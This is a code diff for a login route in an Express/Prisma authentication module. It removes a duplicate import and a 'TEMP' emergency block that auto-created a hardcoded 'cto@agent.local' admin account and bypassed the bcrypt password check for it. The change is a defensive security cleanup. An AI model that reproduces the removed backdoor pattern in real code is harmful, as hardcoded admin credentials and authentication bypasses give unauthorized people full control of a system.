@@ -8,7 +8,6 @@ import { HttpError } from '../utils/http-error.js';
 import { signAccessToken, signRefreshToken, verifyRefreshToken, authRequired } from '../middleware/auth.js';
 import { env } from '../config/env.js';
 import { loginSchema, registerSchema, changePasswordSchema, adminResetPasswordSchema, batchRegisterSchema, forceChangePasswordSchema } from '../schemas/auth.js';
-import { env } from '../config/env.js';
 import { UserRole, InternalRole } from '@prisma/client';
 
 export const authRouter = Router();
@@ -241,27 +240,11 @@ authRouter.post(
     });
 
     if (!user) {
-      // TEMP(2026-06-04): Auto-create cto@agent.local if not exists (emergency recovery)
-      if (body.email.toLowerCase() === 'cto@agent.local' && body.password === 'PASSWORD_REMOVED_BY_SECURITY_CLEANUP') {
-        const hashedPassword = await bcrypt.hash('PASSWORD_REMOVED_BY_SECURITY_CLEANUP', 10);
-        user = await prisma.user.create({
-          data: {
-            name: 'CTO',
-            email: 'cto@agent.local',
-            password: hashedPassword,
-            role: 'admin',
-            internalRole: 'cto',
-            mustChangePassword: false,
-          },
-        });
-      } else {
-        throw new HttpError(401, '邮箱或密码不正确');
-      }
+      throw new HttpError(401, '邮箱或密码不正确');
     }
 
     const passwordMatches = await bcrypt.compare(body.password, user.password);
-    // TEMP(2026-06-04): CTO emergency bypass - skip bcrypt compare for known password
-    if (!passwordMatches && !(body.email.toLowerCase() === 'cto@agent.local' && body.password === 'PASSWORD_REMOVED_BY_SECURITY_CLEANUP')) {
+    if (!passwordMatches) {
       throw new HttpError(401, '邮箱或密码不正确');
     }
     if (!user.enabled) {
